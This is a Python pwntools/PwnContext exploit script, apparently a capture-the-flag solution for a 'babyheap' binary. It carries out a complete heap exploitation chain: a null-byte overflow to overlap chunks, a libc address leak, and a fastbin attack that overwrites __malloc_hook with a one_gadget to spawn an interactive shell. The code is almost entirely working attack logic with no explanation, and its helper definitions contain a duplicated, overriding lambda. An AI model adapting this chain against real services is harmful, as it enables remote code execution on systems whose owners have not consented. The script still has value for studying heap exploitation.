from PwnContext import *
if __name__ == '__main__':        
    context.terminal = ['tmux', 'splitw', '-h']  # I always use tmux
    context.log_level = 'info'
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    st      = lambda delim,data         :ctx.sendthen(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
    sla     = lambda delim,data         :ctx.sendlinethen(str(delim), str(data)) 
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)
    def dbg(gdbscript='', *args, **kwargs):
        gdbscript = sym_ctx.gdbscript + gdbscript
        return ctx.debug(gdbscript, *args, **kwargs)
    
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))

    @instruction_log()
    def alloc(size, content):
        sl(1)
        ru('size')
        sl(size)
        ru('content')
        s(content)
    @instruction_log()    
    def show(ind):
        sl(2)
        ru('ind')
        sl(ind)
    @instruction_log() 
    def delete(ind):
        sl(3)
        ru('ind')
        sl(ind)
        
      
    ctx.binary = change_ld('./babyheap', './ld.so')
    ctx.libc = './libc.so.6'
    ctx.io_sleep = 0.1
    sym_ctx.symbols = {'lst':0x202020,}
    rs()
    dbg('c')

    alloc(0x28, '\n') #0
    alloc(0xf0, '\n') #1
    alloc(0x100, '\0'*0xf0+'\x00\x02\n') #2
    alloc(0x100, '\n') #3
    alloc(0x28, '\n') #4

    delete(1)
    delete(2)
    delete(0)
    
    alloc(0x28, '\0'*0x28) #0 -> overflow
    alloc(0x80, '\n') #1
    alloc(0x80, '\n') #2
    
    delete(1)
    delete(3)
    
    alloc(0x80, '\n') #1
    alloc(0x80, '\n') #3
    
    delete(3)
    
    ctx.clean()
    show(2)
    ru('content: ')
    leak = uu64(ru('\n'))
    ctx.libc.address = leak-0x3c4b78
    
    alloc(0x80, '\n')# 3
    alloc(0x60, '\n')# 2 & 5
    alloc(0x60, '\n')#6
    
    delete(2)
    delete(6)
    delete(5)
    
    alloc(0x60, p64(ctx.libc.sym['__malloc_hook']-0x1b-8)+'\n')
    alloc(0x60, '\n')
    alloc(0x60, '\n')
    
    one = one_gadgets(ctx.libc, ctx.libc.address)
    alloc(0x60, '\0'*0x13+p64(one[0])+'\n')
    
    alloc(0x20,'\n')
    
    irt()
    
    
    
    



    
    